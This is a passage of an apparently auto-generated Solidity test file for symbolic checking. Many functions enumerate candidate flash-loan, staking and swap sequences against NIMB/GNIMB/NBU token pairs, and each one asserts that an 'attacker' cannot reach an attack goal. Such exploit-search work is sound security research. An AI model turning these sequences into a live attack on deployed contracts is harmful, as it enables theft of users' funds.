        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2664(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2665(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2666(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2667(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2668(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2669(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2670(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2671(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2672(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2673(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2674(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2675(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2676(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2677(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2678(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2679(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2680(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2681(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2682(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2683(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2684(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2685(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2686(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2687(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2688(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2689(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2690(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2691(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2692(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2693(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2694(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2695(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2696(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2697(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2698(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2699(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2700(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2701(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2702(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2703(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2704(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2705(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2706(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2707(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2708(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2709(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2710(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2711(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
